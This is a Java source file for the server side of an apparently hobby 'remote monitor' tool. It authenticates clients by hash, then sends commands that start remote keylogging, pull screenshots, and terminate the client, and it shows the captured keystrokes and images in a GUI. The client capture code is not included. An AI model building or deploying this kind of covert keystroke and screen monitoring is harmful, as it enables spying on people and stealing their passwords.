package net;

import gui.ServerDialog;

import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.Socket;

import javax.imageio.ImageIO;

import main.RemoteMonitorServer;

/**
 * Manages the connection between a client and the server
 * @author Caleb Choi
 */
class Connection implements Runnable {

	private Socket connection;
	private String hash;

	private InputStreamReader input;
	private DataOutputStream output;

	private Thread operation;
	private boolean processingImage;

	/**
	 * Initializes the connection with the client. Authentication and communication
	 * will not occur here, but must be run through a new thread
	 * @param connection Socket connection with client
	 * @param hash Client authentication hash
	 * @throws IOException
	 */
	public Connection(Socket connection, String hash) throws IOException {
		this.connection = connection;
		this.hash = hash;

		input = new InputStreamReader(this.connection.getInputStream());
		output = new DataOutputStream(this.connection.getOutputStream());
		output.flush();
	}

	/**
	 * Returns the raw IP address of the connection in textual form
	 * @return IP address of the connection
	 */
	public String getAddress() {return connection.getInetAddress().getHostAddress();}

	/**
	 * Returns the host name of the connected computer
	 * @return Host name of the connected computer
	 */
	public String getHostName() {return connection.getInetAddress().getHostName();}

	/**
	 * Returns the IP address of the connection as an InetAddress
	 * @return IP address of the connection
	 */
	public InetAddress getInetAddress() {return connection.getInetAddress();} 

	/**
	 * Stops the current operation if there is one
	 */
	public boolean killOperation() {
		if (operation != null) {
			operation.interrupt();
			System.out.println("CURRENT THREAD " + getAddress() + " INTERRUPTED");
			operation = null;
			return true;
		} else return false;
	}

	/**
	 * Shuts down the connection to the client. Note that the client will not
	 * receive any forewarning, and the user will not be informed of any dialog
	 * that the connection has been cut. This method will also kill any currently
	 * running operations
	 */
	public void shutdown() {
		killOperation(); // Stops whatever they were doing
		System.out.println("CLIENT " + getAddress() + " DISCONNECTED");

		// Will try to close all output streams
		try {input.close();} catch (IOException e) {System.out.println(getAddress() + " INPUT STREAM FAILED TO CLOSE");}
		try {output.flush();} catch (IOException e) {System.out.println(getAddress() + " OUTPUT STREAM FAILED TO FLUSH");}
		try {output.close();} catch (IOException e) {System.out.println(getAddress() + " OUTPUT STREAM FAILED TO CLOSE");}
		try {connection.close();} catch (IOException e) {System.out.println(getAddress() + " SOCKET CONNECTION FAILED TO CLOSE");}

		// Removes connection from the server list
		System.out.println("REMOVE CONNECTION RESULT: " + RemoteMonitorServer.removeConnection(getInetAddress()));
	}

	/**
	 * Determines whether a connection is dead by trying to send a connection packet
	 * over to the client. If there's an IOException (which there will be if the
	 * TCP connection is cut), then return false
	 * @return Boolean representing the alive status of the connection
	 */
	public boolean isConnectionDead() {
		try {
			output.writeBytes(PacketHeader.CONN + System.getProperty("line.separator"));
			return false;
		} catch (IOException ioe) {return true;}
	}

	/**
	 * Requests a client operation. If there is one in progress, the thread will be
	 * interrupted and cleared
	 * @param header Packet header to be sent
	 */
	public void requestOperation(final String header, final boolean forced) {

		// Kills any currently running operation
		System.out.println("OPERATION REQUESTION TO " + getAddress() + " - " + header);
		if (killOperation()) try {Thread.sleep(100);} catch (Exception e) {}

		if (header.equals(PacketHeader.KEYL)) { // Starts a new thread that listens for client keystrokes
			operation = new Thread(new Runnable() {
				@Override
				public void run() {
					try {
						// Sends a request packet to the client to start keylogging functions
						output.writeBytes(header + System.getProperty("line.separator"));
						System.out.println("KEYLOG REQUEST SENT");

						// Clears the remaining input, which is usually old picture data
						System.out.println("Clearing " + connection.getInputStream().available() + " leftover bytes");
						connection.getInputStream().skip(connection.getInputStream().available());
						
						// Keep listening until thread is interrupted
						BufferedReader bufferedInput = new BufferedReader(input);
						while (!Thread.currentThread().isInterrupted()) {
							if (input.ready() && !processingImage) {
								String keystroke = bufferedInput.readLine();
								System.out.print(keystroke);
								
								// Adds the logged key to the text area if that's still existent
								RemoteMonitorServer.addText(keystroke);
							}
						}

						// Once thread is interrupted, send message to client to stop recording keystrokes
						output.writeBytes(header + System.getProperty("line.separator"));
						System.out.println("KEYLOG DESIST SENT");
						operation = null;
						
					} catch (IOException e) { // IOException means the client disconnected
						shutdown(); 
						if (!forced) ServerDialog.showConnectionCutDialog(getInetAddress());
						operation = null;
					}
				}
			});
			operation.start();

		} else if (header.equals(PacketHeader.PICT)) { // Tells client to send a screencap over
			try {
				// Sends a request packet to the client to send a screen capture
				output.writeBytes(header + System.getProperty("line.separator"));
				System.out.println("PICTURE REQUEST SENT");
				
				// Clears the remaining input, which is usually leftover keylog stuff
				System.out.println("Clearing " + connection.getInputStream().available() + " leftover bytes");
				connection.getInputStream().skip(connection.getInputStream().available());
				
				// Waits until there's actually an image to read
				while (true) {
					if (input.ready()) {

						// Read the incoming picture
						System.out.println("IMAGE DATA RECEIVED - PROCESSING");
						BufferedImage screenshot = ImageIO.read(connection.getInputStream());
						System.out.println("IMAGE RECEIVED FROM: " + getInetAddress().getHostAddress());
						
						// Updates the GUI panel
						RemoteMonitorServer.resetPictureArea(screenshot);
						
						// Clears the remaining input again. Sometimes there's some random crap leftover
						System.out.println("Clearing " + connection.getInputStream().available() + " leftover bytes");
						connection.getInputStream().skip(connection.getInputStream().available());
						break;
					}
				}
				
			} catch (IOException e) { // IOException means the client disconnected
				shutdown(); 
				if (!forced) ServerDialog.showConnectionCutDialog(getInetAddress());
			}
		} else if (header.equals(PacketHeader.KILL)) { // Tells client to terminate its existence

			// Try to send a kill request to client
			try {output.writeBytes(header + System.getProperty("line.separator"));} 
			catch (IOException e) {System.out.println("KILL REQUEST WAS UNABLE TO BE SENT");}
			finally {shutdown();} // Regardless of whether the kill request was able to be sent, server closes client

		} else System.out.println("INVALID REQUEST HEADER - IGNORING REQUEST TO " + getAddress());
	}

	/**
	 * Runs the authentication between the server and client in a separate thread
	 */
	@Override
	public void run() {

		// Listens for the authentication packet
		while (true) {
			try {
				// If there is input to be read
				BufferedReader bufferedInput = new BufferedReader(input);
				if (input.ready()) {
					String[] authMessage = bufferedInput.readLine().split(" ");

					// Checks to see if the header and hash for authentication is valid
					if (authMessage[0].equals(PacketHeader.AUTH)) {
						System.out.println("AUTHENTICATION PACKET RECEIVED: " + getAddress());

						// Check if the client hash matches
						if (authMessage[1].equals(hash)) {
							System.out.println("CLIENT HASH MATCHED");
							System.out.println(getAddress() + "  SUCCESSFULLY CONNECTED");
							break;

						} else { // If the hashes don't match, kill connection
							System.out.println("ERROR: HASH MISMATCH");
							throw new Exception("Hash mismatch");
						}

					} else { // If the header is invalid
						System.out.println("ERROR: INVALID AUTHENTICATION HEADER");
						throw new Exception("Invalid authentication header");
					}
				}
			} catch (Exception e) {
				System.out.println("EXITING THREAD");
				e.printStackTrace();
				try {
					shutdown();
					System.out.println("CONNECTION TERMINATED");
				} catch (Exception ex) {
					System.out.println("CONNECTION COULD NOT BE TERMINATED");}
				return;
			}
		}

		// Sends back a confirmation packet to the client
		try {
			output.writeBytes(PacketHeader.CONN + " " + hash + System.getProperty("line.separator"));
			System.out.println("CONFIRMATION PACKET SENT");
		} catch (IOException e) {
			System.out.println("CONFIRMATION PACKET COULD NOT BE SENT");
			try {
				shutdown();
				System.out.println("TERMINATING CONNECTION");
			} catch (Exception ex) {
				System.out.println("CONNECTION COULD NOT BE TERMINATED");}
			return;
		}
		System.out.println(RemoteMonitorServer.getConnectionList().size() + " Connected clients");

		// Updates the client list in the GUI
		RemoteMonitorServer.updateClientList();
	}
}